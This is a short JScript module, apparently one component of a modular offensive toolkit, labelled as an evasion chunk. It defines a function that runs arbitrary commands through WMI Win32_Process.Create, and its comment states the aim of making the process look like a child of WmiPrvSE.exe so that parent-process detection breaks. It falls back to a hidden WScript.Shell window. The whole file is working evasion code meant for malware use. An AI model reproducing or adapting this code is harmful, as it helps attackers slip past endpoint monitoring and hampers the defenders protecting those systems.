// chunk: evasion/process_wmi
// depends: (none)
// provides: create_process
// format: jscript
// note: Creates processes via WMI Win32_Process.Create. Process appears as
//       child of WmiPrvSE.exe rather than wscript/cscript, breaking parent
//       process chain analysis.

function create_process(cmd) {
    try {
        var loc = new ActiveXObject("WbemScripting.SWbemLocator");
        var svc = loc.ConnectServer(".", "root\\cimv2");
        var proc = svc.Get("Win32_Process");
        var method = proc.Methods_("Create");
        var params = method.InParameters.SpawnInstance_();
        params.CommandLine = cmd;
        svc.ExecMethod("Win32_Process", "Create", params);
    } catch(e) {
        /* Fallback to direct shell */
        var sh = new ActiveXObject("WScript.Shell");
        sh.Run(cmd, 0, false);
    }
}
